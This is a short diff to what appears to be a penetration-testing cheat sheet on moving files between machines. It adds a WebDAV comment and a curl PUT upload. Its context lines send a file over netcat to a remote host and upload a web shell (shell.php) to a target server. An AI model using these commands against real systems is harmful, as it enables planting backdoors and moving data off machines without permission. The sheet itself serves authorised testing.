@@ -8,7 +8,11 @@ On the uploading machine run:
 nc $ip 443 < transfer.txt
 
 # Upload (curl)
+## This is useful especially when we setup a WebDAV server on local machine
 curl --upload-file shell.php --url http://$ip/shell.php --http1.0
+or
+curl -X PUT -T "/path/to/file" "http://$ip/puturl.tmp" 
+
 
 # Download (curl)
 curl -O http://host/file
